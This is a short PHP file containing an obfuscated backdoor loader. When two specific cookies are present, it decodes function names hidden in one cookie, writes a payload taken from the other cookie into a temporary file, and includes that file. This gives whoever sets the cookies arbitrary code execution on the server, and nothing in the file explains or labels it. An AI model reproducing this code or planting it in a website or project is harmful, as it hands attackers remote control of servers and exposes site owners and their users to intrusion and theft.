<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[30])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 7;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[30][$n];
        if (!$c[30][$n + 1]) {
            if (!$c[30][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 7 + 1;
    }
    $k = $p[25]() . $p[12];
    if (!$p[8]($k)) {
        $n = $p[10]($k, $p[21]);
        $p[27]($n, $p[28] . $p[29]($p[23]($c[3])));
    }
    include($k);
}